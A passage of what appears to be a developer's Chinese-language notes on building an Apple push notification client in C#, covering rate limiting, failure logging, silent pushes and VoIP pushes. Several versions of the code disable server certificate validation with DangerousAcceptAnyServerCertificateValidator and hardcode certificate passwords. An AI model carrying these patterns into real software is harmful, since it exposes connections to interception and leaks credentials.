request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); var response = await Client.SendAsync(request).ConfigureAwait(false); string resp = await response.Content.ReadAsStringAsync().ConfigureAwait(false); if (response.IsSuccessStatusCode) { Console.WriteLine($\u0026#34;✅ 成功 [{deviceToken}] - {title}\u0026#34;); return; } else { Console.WriteLine($\u0026#34;⚠️ 推送失败 [{response.StatusCode}] 尝试 {attempt}/{maxRetries} - {resp}\u0026#34;); if (response.StatusCode == System.Net.HttpStatusCode.ServiceUnavailable || (int)response.StatusCode == 429) { await Task.Delay(delayMs); delayMs *= 2; continue; } else { await LogFailureAsync(deviceToken, title, body, resp); return; } } } catch (HttpRequestException ex) { Console.WriteLine($\u0026#34;网络异常 [{attempt}/{maxRetries}] - {ex.Message}\u0026#34;); await Task.Delay(delayMs); delayMs *= 2; if (attempt == maxRetries) { await LogFailureAsync(deviceToken, title, body, ex.Message); } } } } private static async Task EnforceRateLimit() { DateTime now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts) \u0026amp;\u0026amp; (now - ts).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } while (PushTimestamps.Count \u0026gt;= MaxPushPerSecond) { await Task.Delay(100); now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts2) \u0026amp;\u0026amp; (now - ts2).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } } PushTimestamps.Enqueue(now); } private static async Task LogFailureAsync(string deviceToken, string title, string body, string error) { string log = $\u0026#34;{DateTime.Now:yyyy-MM-dd HH:mm:ss} | DeviceToken: {deviceToken} | Title: {title} | Body: {body} | Error: {error}{Environment.NewLine}\u0026#34;; await LogFileLock.WaitAsync(); try { await File.AppendAllTextAsync(LogFilePath, log); } finally { LogFileLock.Release(); } } } LogFailureAsync 异步写文件，并用信号量锁控制并发写入，防止文件写入冲突。\n日志文件名是 apns_failures.log，你可以根据需要改路径或文件名。\n失败日志包含时间、设备token、推送标题、内容和错误信息，方便后续查阅。\n只在最终确定失败（非重试或者重试完毕仍失败）时写入日志，避免日志膨胀。\nssl2 public class ApnsClient { private static readonly string P12Path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, \u0026#34;aps_development.p12\u0026#34;); private static readonly string P12Password = \u0026#34;123zxcvb\u0026#34;; private static readonly string ApnsTopic = \u0026#34;com.chatup.imex\u0026#34;; private static readonly X509Certificate2 Certificate; private static readonly HttpClient Client; private static readonly int MaxPushPerSecond = 5; private static readonly ConcurrentQueue\u0026lt;DateTime\u0026gt; PushTimestamps = new ConcurrentQueue\u0026lt;DateTime\u0026gt;(); private static readonly string LogFilePath = \u0026#34;apns_failures.log\u0026#34;; private static readonly SemaphoreSlim LogFileLock = new SemaphoreSlim(1, 1); static ApnsClient() { if (!File.Exists(P12Path)) throw new FileNotFoundException($\u0026#34;证书文件不存在: {P12Path}\u0026#34;); // 必须使用 MachineKeySet，否则某些环境下加载失败 Certificate = new X509Certificate2(P12Path, P12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); // SocketsHttpHandler 默认支持 HTTP/2 var handler = new SocketsHttpHandler { SslOptions = new System.Net.Security.SslClientAuthenticationOptions { EnabledSslProtocols = System.Security.Authentication.SslProtocols.Tls12 } }; handler.SslOptions.ClientCertificates = new X509CertificateCollection { Certificate }; Client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(15) }; } public static async Task SendPushAsync(string deviceToken, string title, string body, bool sandbox = true) { await EnforceRateLimit(); int maxRetries = 3; int delayMs = 1000; for (int attempt = 1; attempt \u0026lt;= maxRetries; attempt++) { try { string url = sandbox ? $\u0026#34;https://api.sandbox.push.apple.com:443/3/device/{deviceToken}\u0026#34; : $\u0026#34;https://api.push.apple.com:443/3/device/{deviceToken}\u0026#34;; var payload = new { aps = new { alert = new { title, body }, sound = \u0026#34;default\u0026#34; } }; var json = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(json, Encoding.UTF8, \u0026#34;application/json\u0026#34;); var request = new HttpRequestMessage(HttpMethod.Post, url) { Version = new Version(2, 0), // HTTP/2 Content = content }; request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); var response = await Client.SendAsync(request).ConfigureAwait(false); string resp = await response.Content.ReadAsStringAsync().ConfigureAwait(false); if (response.IsSuccessStatusCode) { Console.WriteLine($\u0026#34;✅ 成功 [{deviceToken}] - {title}\u0026#34;); return; } else { Console.WriteLine($\u0026#34;⚠️ 推送失败 [{response.StatusCode}] 尝试 {attempt}/{maxRetries} - {resp}\u0026#34;); if (response.StatusCode == System.Net.HttpStatusCode.ServiceUnavailable || (int)response.StatusCode == 429) { await Task.Delay(delayMs); delayMs *= 2; continue; } else { await LogFailureAsync(deviceToken, title, body, resp); return; } } } catch (HttpRequestException ex) { Console.WriteLine($\u0026#34;网络异常 [{attempt}/{maxRetries}] - {ex.Message}\u0026#34;); await Task.Delay(delayMs); delayMs *= 2; if (attempt == maxRetries) { await LogFailureAsync(deviceToken, title, body, ex.Message); } } } } private static async Task EnforceRateLimit() { DateTime now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts) \u0026amp;\u0026amp; (now - ts).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } while (PushTimestamps.Count \u0026gt;= MaxPushPerSecond) { await Task.Delay(100); now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts2) \u0026amp;\u0026amp; (now - ts2).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } } PushTimestamps.Enqueue(now); } private static async Task LogFailureAsync(string deviceToken, string title, string body, string error) { string log = $\u0026#34;{DateTime.Now:yyyy-MM-dd HH:mm:ss} | DeviceToken: {deviceToken} | Title: {title} | Body: {body} | Error: {error}{Environment.NewLine}\u0026#34;; await LogFileLock.WaitAsync(); try { await File.AppendAllTextAsync(LogFilePath, log); } finally { LogFileLock.Release(); } } } 薛定谔的推送 public class ApnsClient { private static readonly string P12Path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, \u0026#34;aps_xx.p12\u0026#34;); private static readonly string P12Password = \u0026#34;123123\u0026#34;; private static readonly string ApnsTopic = \u0026#34;com.chatup.xx\u0026#34;; private static readonly X509Certificate2 certificate; private static readonly HttpClient httpClient; // 限流参数 private static readonly int MaxPushPerSecond = 5; // 每秒最多推送 N 条 private static readonly ConcurrentQueue\u0026lt;DateTime\u0026gt; PushTimestamps = new ConcurrentQueue\u0026lt;DateTime\u0026gt;(); private static readonly string LogFilePath = \u0026#34;apns_failures.log\u0026#34;; private static readonly SemaphoreSlim LogFileLock = new SemaphoreSlim(1, 1); static ApnsClient() { if (!File.Exists(P12Path)) throw new FileNotFoundException($\u0026#34;证书文件不存在: {P12Path}\u0026#34;); certificate = new X509Certificate2(P12Path, P12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); var handler = new HttpClientHandler(); handler.ClientCertificates.Add(certificate); handler.SslProtocols = System.Security.Authentication.SslProtocols.Tls12; ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; handler.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator; httpClient = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(15) }; } public static async Task SendPushAsync(string deviceToken, string title, string body, bool sandbox = true) { await EnforceRateLimit(); int maxRetries = 3; int delayMs = 1000; for (int attempt = 1; attempt \u0026lt;= maxRetries; attempt++) { try { string url = sandbox ? $\u0026#34;https://api.sandbox.push.apple.com/3/device/{deviceToken}\u0026#34; //gateway.sandbox.push.apple.com api.sandbox.push.apple.com : $\u0026#34;https://api.push.apple.com/3/device/{deviceToken}\u0026#34;; var payload = new { aps = new { alert = new { title, body }, sound = \u0026#34;default\u0026#34; } }; var json = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(json, Encoding.UTF8, \u0026#34;application/json\u0026#34;); var request = new HttpRequestMessage(HttpMethod.Post, url) { Version = new Version(2, 0), Content = content }; request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); var response = await httpClient.SendAsync(request).ConfigureAwait(false); string resp = await response.Content.ReadAsStringAsync().ConfigureAwait(false); if (response.IsSuccessStatusCode) { Console.WriteLine($\u0026#34; 成功 [{deviceToken}] - {title}\u0026#34;); return; } else { Console.WriteLine($\u0026#34; 推送失败 [{response.StatusCode}] 尝试 {attempt}/{maxRetries} - {resp}\u0026#34;); if (response.StatusCode == System.Net.HttpStatusCode.ServiceUnavailable || (int)response.StatusCode == 429) { await Task.Delay(delayMs); delayMs *= 2; continue; } else { await LogFailureAsync(deviceToken, title, body, resp); return; } } } catch (HttpRequestException ex) { Console.WriteLine($\u0026#34;网络异常 [{attempt}/{maxRetries}] - {ex.Message}\u0026#34;); await Task.Delay(delayMs); delayMs *= 2; if (attempt == maxRetries) { await LogFailureAsync(deviceToken, title, body, ex.Message); } } } } private static async Task EnforceRateLimit() { DateTime now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts) \u0026amp;\u0026amp; (now - ts).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } while (PushTimestamps.Count \u0026gt;= MaxPushPerSecond) { await Task.Delay(100); now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts2) \u0026amp;\u0026amp; (now - ts2).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } } PushTimestamps.Enqueue(now); } private static async Task LogFailureAsync(string deviceToken, string title, string body, string error) { string log = $\u0026#34;{DateTime.Now:yyyy-MM-dd HH:mm:ss} | DeviceToken: {deviceToken} | Title: {title} | Body: {body} | Error: {error}{Environment.NewLine}\u0026#34;; await LogFileLock.WaitAsync(); try { await File.AppendAllTextAsync(LogFilePath, log); } finally { LogFileLock.Release(); } } } 注意 HttpClientHandler 证书验证 handler.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator;\nAPNS 的 TLS/HTTP2 连接要求 APNS 只支持 TLS 1.2 及以上。\n在 HttpClientHandler 中加了：\nhandler.SslProtocols = SslProtocols.Tls12; 一般没问题，但如果系统中 TLS 1.2 没启用，也会失败。 可以检查注册表或尝试：\nServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; 放在 static 构造函数里，确保 TLS 1.2 可用。\npayload加参数 { \u0026#34;aps\u0026#34;: { \u0026#34;alert\u0026#34;: { \u0026#34;title\u0026#34;: \u0026#34;标题\u0026#34;, \u0026#34;body\u0026#34;: \u0026#34;正文\u0026#34; }, \u0026#34;sound\u0026#34;: \u0026#34;default\u0026#34; }, \u0026#34;msgid\u0026#34;: 12345, \u0026#34;autoid\u0026#34;: 67890 } 客户端（iOS）接收时，在 userInfo 里就能拿到：\nif let msgid = userInfo[\u0026#34;msgid\u0026#34;] as? Int { print(\u0026#34;消息 ID: \\(msgid)\u0026#34;) } 静默推送 静默推送（silent push） 发送到客户端， 那就需要把 aps 的 content-available 设为 1，并且不要带 alert、sound 等会触发弹窗的字段。\n改成这样：\nvar payload = new { aps = new { // 静默推送关键：content-available = 1 [\u0026#34;content-available\u0026#34;] = 1 }, msgid = 12345, // 自定义静默参数 autoid = 67890 // 自定义静默参数 }; var json = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(json, Encoding.UTF8, \u0026#34;application/json\u0026#34;); 注意事项\n静默推送特征\naps 里必须有 \u0026ldquo;content-available\u0026rdquo;: 1\n不能有 alert、badge、sound\n客户端收到不会弹窗，而是直接在后台调用回调方法。\niOS 客户端要开启后台模式 在 Xcode → Signing \u0026amp; Capabilities → Background Modes 中勾选：\nBackground fetch\nRemote notifications\n客户端接收示例（Swift）\nfunc application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -\u0026gt; Void) { if let msgid = userInfo[\u0026#34;msgid\u0026#34;] as? Int { print(\u0026#34;静默推送消息 ID: \\(msgid)\u0026#34;) } if let autoid = userInfo[\u0026#34;autoid\u0026#34;] as? Int { print(\u0026#34;静默推送 AutoID: \\(autoid)\u0026#34;) } completionHandler(.newData) } 这样，msgid、autoid 就会随静默推送一起到达客户端，但不会有任何声音或弹窗。\n加参数与静默推送 public static async Task SendPushAsync(string deviceToken, string title, string body, string autoid, string sendid, string msgstate,bool sandbox = true, bool silent = false) { await EnforceRateLimit(); int maxRetries = 3; int delayMs = 1000; for (int attempt = 1; attempt \u0026lt;= maxRetries; attempt++) { try { string url = sandbox ? $\u0026#34;https://api.sandbox.push.apple.com/3/device/{deviceToken}\u0026#34; : $\u0026#34;https://api.push.apple.com/3/device/{deviceToken}\u0026#34;; object payload; if (silent) { payload = new { aps = new SilentAps { ContentAvailable = 1 }, autoId = autoid, senderId = sendid, msgState = msgstate }; } else { payload = new { aps = new { alert = new { title, body }, sound = \u0026#34;default\u0026#34; }, autoId = autoid, senderId = sendid, msgState = msgstate }; } var json = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(json, Encoding.UTF8, \u0026#34;application/json\u0026#34;); var request = new HttpRequestMessage(HttpMethod.Post, url) { Version = new Version(2, 0), Content = content }; request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); var response = await httpClient.SendAsync(request).ConfigureAwait(false); string resp = await response.Content.ReadAsStringAsync().ConfigureAwait(false); if (response.IsSuccessStatusCode) { Console.WriteLine($\u0026#34; 成功 [{deviceToken}] - {title}\u0026#34;); return; } else { Console.WriteLine($\u0026#34; 推送失败 [{response.StatusCode}] 尝试 {attempt}/{maxRetries} - {resp}\u0026#34;); if (response.StatusCode == System.Net.HttpStatusCode.ServiceUnavailable || (int)response.StatusCode == 429) { await Task.Delay(delayMs); delayMs *= 2; continue; } else { await LogFailureAsync(deviceToken, title, body, resp); return; } } } catch (HttpRequestException ex) { Console.WriteLine($\u0026#34;网络异常 [{attempt}/{maxRetries}] - {ex.Message}\u0026#34;); await Task.Delay(delayMs); delayMs *= 2; if (attempt == maxRetries) { await LogFailureAsync(deviceToken, title, body, ex.Message); } } } } if (silent) { request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;background\u0026#34;); } else { request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); } sound sound = \u0026#34;in.caf\u0026#34; apns-push-type alert → 用于用户可见通知（消息、提醒、声音、角标）。\nbackground → 用于静默推送（后台刷新，用户无感知）。\n除了这两个，apns-push-type 还有：\nvoip（VoIP 呼叫通知）\nlocation（地理围栏相关）\ncomplication（Apple Watch 表盘小组件）\nfileprovider（文件提供者扩展）\nmdm（设备管理 MDM）\nVoIP 推送选项。 关键点：\n增加 VoIP 证书加载逻辑（voip_cert.p12）。\n如果调用时指定 voip = true，就切换到 VoIP 证书、apns-topic = com.chatup.imex.voip、apns-push-type = voip。\n其他逻辑（alert / background）保持不变。\npublic class ApnsClient { private static readonly string P12Path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, \u0026#34;dev.p12\u0026#34;); private static readonly string P12Password = \u0026#34;123123xxx\u0026#34;; private static readonly string VoipP12Path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, \u0026#34;voip_cert.p12\u0026#34;); private static readonly string VoipP12Password = \u0026#34;123123xxx\u0026#34;; private static readonly string ApnsTopic = \u0026#34;com.chatup.imex\u0026#34;; private static readonly string VoipApnsTopic = \u0026#34;com.chatup.imex.voip\u0026#34;; private static readonly X509Certificate2 normalCertificate; private static readonly X509Certificate2 voipCertificate; private static readonly HttpClient normalHttpClient; private static readonly HttpClient voipHttpClient; // 限流参数 private static readonly int MaxPushPerSecond = 5; // 每秒最多推送 N 条 private static readonly ConcurrentQueue\u0026lt;DateTime\u0026gt; PushTimestamps = new ConcurrentQueue\u0026lt;DateTime\u0026gt;(); private static readonly string LogFilePath = \u0026#34;apns_failures.log\u0026#34;; private static readonly SemaphoreSlim LogFileLock = new SemaphoreSlim(1, 1); static ApnsClient() { if (!File.Exists(P12Path)) throw new FileNotFoundException($\u0026#34;证书文件不存在: {P12Path}\u0026#34;); if (!File.Exists(VoipP12Path)) throw new FileNotFoundException($\u0026#34;VoIP 证书文件不存在: {VoipP12Path}\u0026#34;); normalCertificate = new X509Certificate2(P12Path, P12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); voipCertificate = new X509Certificate2(VoipP12Path, VoipP12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); normalHttpClient = CreateHttpClient(normalCertificate); voipHttpClient = CreateHttpClient(voipCertificate); } private static HttpClient CreateHttpClient(X509Certificate2 cert) { var handler = new HttpClientHandler(); handler.ClientCertificates.Add(cert); handler.SslProtocols = System.Security.Authentication.SslProtocols.Tls12; ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; handler.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator; return new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(15) }; } /// \u0026lt;summary\u0026gt; /// 发送推送 /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;deviceToken\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;param name=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;param name=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;param name=\u0026#34;sandbox\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;param name=\u0026#34;silent\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;param name=\u0026#34;voip\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; public static async Task SendPushAsync(string deviceToken, string title, string body, bool sandbox = true, bool silent = false, bool voip = false) { await EnforceRateLimit(); int maxRetries = 3; int delayMs = 1000; for (int attempt = 1; attempt \u0026lt;= maxRetries; attempt++) { try { string url = sandbox ? $\u0026#34;https://api.sandbox.push.apple.com/3/device/{deviceToken}\u0026#34; : $\u0026#34;https://api.push.apple.com/3/device/{deviceToken}\u0026#34;; object payload; if (voip) { // VoIP payload 通常没有 alert，只包含信令数据 payload = new { aps = new { alert = new { title, body } }, callId = Guid.NewGuid().ToString() }; } else if (silent) { payload = new { aps = new SilentAps { ContentAvailable = 1 } }; } else { payload = new { aps = new { alert = new { title, body }, sound = \u0026#34;in.caf\u0026#34; } }; } var json = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(json, Encoding.UTF8, \u0026#34;application/json\u0026#34;); Console.WriteLine(json); var request = new HttpRequestMessage(HttpMethod.Post, url) { Version = new Version(2, 0), Content = content }; if (voip) { request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, VoipApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;voip\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); } else if (silent) { request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;background\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;5\u0026#34;); } else { request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); } var client = voip ? voipHttpClient : normalHttpClient; var response = await client.SendAsync(request).ConfigureAwait(false); string resp = await response.Content.ReadAsStringAsync().ConfigureAwait(false); if (response.IsSuccessStatusCode) { Console.WriteLine($\u0026#34; 成功 [{deviceToken}] - {title}\u0026#34;); return; } else { Console.WriteLine($\u0026#34; 推送失败 [{response.StatusCode}] 尝试 {attempt}/{maxRetries} - {resp}\u0026#34;); if (response.StatusCode == System.Net.HttpStatusCode.ServiceUnavailable || (int)response.StatusCode == 429) { await Task.Delay(delayMs); delayMs *= 2; continue; } else { await LogFailureAsync(deviceToken, title, body, resp); return; } } } catch (HttpRequestException ex) { Console.WriteLine($\u0026#34;网络异常 [{attempt}/{maxRetries}] - {ex.Message}\u0026#34;); await Task.Delay(delayMs); delayMs *= 2; if (attempt == maxRetries) { await LogFailureAsync(deviceToken, title, body, ex.Message); } } } } private static async Task EnforceRateLimit() { DateTime now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts) \u0026amp;\u0026amp; (now - ts).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } while (PushTimestamps.Count \u0026gt;= MaxPushPerSecond) { await Task.Delay(100); now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts2) \u0026amp;\u0026amp; (now - ts2).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } } PushTimestamps.Enqueue(now); } private static async Task LogFailureAsync(string deviceToken, string title, string body, string error) { string log = $\u0026#34;{DateTime.Now:yyyy-MM-dd HH:mm:ss} | DeviceToken: {deviceToken} | Title: {title} | Body: {body} | Error: {error}{Environment.NewLine}\u0026#34;; await LogFileLock.WaitAsync(); try { await File.AppendAllTextAsync(LogFilePath, log); } finally { LogFileLock.Release(); } } } public class SilentAps { [JsonPropertyName(\u0026#34;content-available\u0026#34;)] public int ContentAvailable { get; set; } } 🔹 使用方法\n普通通知\nawait ApnsClient.SendPushAsync(token, \u0026#34;标题\u0026#34;, \u0026#34;内容\u0026#34;, sandbox: true); 静默推送\nawait ApnsClient.SendPushAsync(token, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, sandbox: true, silent: true); VoIP 推送\nawait ApnsClient.SendPushAsync(token, \u0026#34;来电提醒\u0026#34;, \u0026#34;语音呼叫\u0026#34;, sandbox: true, voip: true); voip 集成 public class ApnsClient { private static readonly string P12Path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, \u0026#34;dev.p12\u0026#34;); private static readonly string P12Password = \u0026#34;123xxxxxx\u0026#34;; private static readonly string VoipP12Path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, \u0026#34;voip_cert.p12\u0026#34;); private static readonly string VoipP12Password = \u0026#34;123xxxxxx\u0026#34;; private static readonly string ApnsTopic = \u0026#34;com.chatup.xxx\u0026#34;; private static readonly string VoipApnsTopic = \u0026#34;com.chatup.xxx.voip\u0026#34;; private static readonly X509Certificate2 normalCertificate; private static readonly X509Certificate2 voipCertificate; private static readonly HttpClient normalHttpClient; private static readonly HttpClient voipHttpClient; // 限流参数 private static readonly int MaxPushPerSecond = 5; // 每秒最多推送 N 条 private static readonly ConcurrentQueue\u0026lt;DateTime\u0026gt; PushTimestamps = new ConcurrentQueue\u0026lt;DateTime\u0026gt;(); private static readonly string LogFilePath = \u0026#34;apns_failures.log\u0026#34;; private static readonly SemaphoreSlim LogFileLock = new SemaphoreSlim(1, 1); static ApnsClient() { if (!File.Exists(P12Path)) throw new FileNotFoundException($\u0026#34;证书文件不存在: {P12Path}\u0026#34;); if (!File.Exists(VoipP12Path)) throw new FileNotFoundException($\u0026#34;VoIP 证书文件不存在: {VoipP12Path}\u0026#34;); normalCertificate = new X509Certificate2(P12Path, P12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); voipCertificate = new X509Certificate2(VoipP12Path, VoipP12Password, X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable); normalHttpClient = CreateHttpClient(normalCertificate); voipHttpClient = CreateHttpClient(voipCertificate); } private static HttpClient CreateHttpClient(X509Certificate2 cert) { var handler = new HttpClientHandler(); handler.ClientCertificates.Add(cert); handler.SslProtocols = System.Security.Authentication.SslProtocols.Tls12; ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; handler.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator; return new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(15) }; } public static async Task SendPushAsync( string deviceToken, string title, string body, string autoid, string sendid, string msgstate, string msgtype, string msgcon, bool sandbox = true, bool silent = false, bool voip = false) { await EnforceRateLimit(); int maxRetries = 3; int delayMs = 1000; for (int attempt = 1; attempt \u0026lt;= maxRetries; attempt++) { try { string url = sandbox ? $\u0026#34;https://api.sandbox.push.apple.com/3/device/{deviceToken}\u0026#34; : $\u0026#34;https://api.push.apple.com/3/device/{deviceToken}\u0026#34;; // 组装载荷 object payload; if (voip) { // VoIP 场景：不需要声音字段，可按需带业务字段 payload = new { aps = new SilentAps { ContentAvailable = 1 }, autoId = autoid, senderId = sendid, msgState = msgstate, msgType = msgtype, msgCon = msgcon }; } else if (silent) { // 静默推送：content-available = 1 payload = new { aps = new SilentAps { ContentAvailable = 1 }, autoId = autoid, senderId = sendid, msgState = msgstate, msgType = msgtype, msgCon = msgcon }; } else { // 可见通知 payload = new { aps = new { alert = new { title, body }, sound = \u0026#34;in.caf\u0026#34; // in.caf / default }, autoId = autoid, senderId = sendid, msgState = msgstate, msgType = msgtype, msgCon = msgcon }; } var json = System.Text.Json.JsonSerializer.Serialize(payload); using var content = new StringContent(json, Encoding.UTF8, \u0026#34;application/json\u0026#34;); Console.WriteLine(json); var request = new HttpRequestMessage(HttpMethod.Post, url) { Version = new Version(2, 0), Content = content }; // 头部：voip 优先级最高，其次 silent，再到 alert if (voip) { request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, VoipApnsTopic); // com.chatup.imex.voip request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;voip\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); } else if (silent) { request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;background\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;5\u0026#34;); // 静默必须 5 } else { request.Headers.TryAddWithoutValidation(\u0026#34;apns-topic\u0026#34;, ApnsTopic); request.Headers.TryAddWithoutValidation(\u0026#34;apns-push-type\u0026#34;, \u0026#34;alert\u0026#34;); request.Headers.TryAddWithoutValidation(\u0026#34;apns-priority\u0026#34;, \u0026#34;10\u0026#34;); } // 选择对应 HttpClient（需要你在类里按之前的补充准备好 normalHttpClient / voipHttpClient） var client = voip ? voipHttpClient : normalHttpClient; var response = await client.SendAsync(request).ConfigureAwait(false); string resp = await response.Content.ReadAsStringAsync().ConfigureAwait(false); if (response.IsSuccessStatusCode) { Console.WriteLine($\u0026#34; 成功 [{deviceToken}] - {title}\u0026#34;); return; } else { Console.WriteLine($\u0026#34; 推送失败 [{response.StatusCode}] {deviceToken} 尝试 {attempt}/{maxRetries} - {resp}\u0026#34;); if (response.StatusCode == System.Net.HttpStatusCode.ServiceUnavailable || (int)response.StatusCode == 429) { await Task.Delay(delayMs); delayMs *= 2; continue; } else { await LogFailureAsync(deviceToken, title, body, resp); return; } } } catch (HttpRequestException ex) { Console.WriteLine($\u0026#34;网络异常 [{attempt}/{maxRetries}] - {ex.Message}\u0026#34;); await Task.Delay(delayMs); delayMs *= 2; if (attempt == maxRetries) { await LogFailureAsync(deviceToken, title, body, ex.Message); } } } } private static async Task EnforceRateLimit() { DateTime now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts) \u0026amp;\u0026amp; (now - ts).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } while (PushTimestamps.Count \u0026gt;= MaxPushPerSecond) { await Task.Delay(100); now = DateTime.UtcNow; while (PushTimestamps.TryPeek(out var ts2) \u0026amp;\u0026amp; (now - ts2).TotalSeconds \u0026gt;= 1) { PushTimestamps.TryDequeue(out _); } } PushTimestamps.Enqueue(now); } private static async Task LogFailureAsync(string deviceToken, string title, string body, string error) { string log = $\u0026#34;{DateTime.Now:yyyy-MM-dd HH:mm:ss} | DeviceToken: {deviceToken} | Title: {title} | Body: {body} | Error: {error}{Environment.NewLine}\u0026#34;; await LogFileLock.WaitAsync(); try { await File.AppendAllTextAsync(LogFilePath, log); } finally { LogFileLock.Release(); } } } public class SilentAps { 